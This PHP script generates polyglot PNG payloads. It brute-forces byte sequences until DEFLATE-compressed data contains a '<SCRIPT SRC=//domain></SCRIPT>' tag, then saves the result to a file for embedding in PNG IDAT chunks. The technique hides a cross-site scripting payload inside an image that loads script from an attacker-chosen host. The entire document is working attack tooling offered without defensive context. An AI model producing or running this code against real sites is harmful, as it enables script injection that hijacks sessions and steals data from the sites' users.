<?php
  $domain = strtoupper($argv[1]);
  $filename = $argv[2];

  // DEFLATE stream bytes
  $prefix = '7ff399281922111510691928276e6e';
  $suffix = '576e69b16375535b6f';

  $precode = '<SCRIPT SRC=//';
  $postcode = '></SCRIPT>';

  print "Input string to embed in PNG IDAT chunks:\n";
  print '"' . $precode . $domain . $postcode . "\"\n\n\n";

  $cnt = 0;
  for( $i = 0x111111111111; $i < 0xffffffffffff; $i++, $cnt++) {
    $b = implode('', str_split(str_pad(dechex($i), 12, '0', STR_PAD_LEFT), 2));

    try {
      $defl = gzdeflate(hex2bin($prefix . $b . $suffix ));

      if ( $cnt % 100000 == 0) {
        printf("[Probe: %06d] %s\r\n", $cnt, $defl);
      }

      if (strpos(strtoupper($defl), $precode.$domain.$postcode) !== false ) { 
        $cont = bin2hex($defl);
        printf("DEFLATE stream found!\n%s\n%s\n\n", $prefix.$b.$suffix, $defl);
        file_put_contents($filename, $cont);
      }
    } catch( exception $e) {
    }
  }

  print 'Done.'
?>
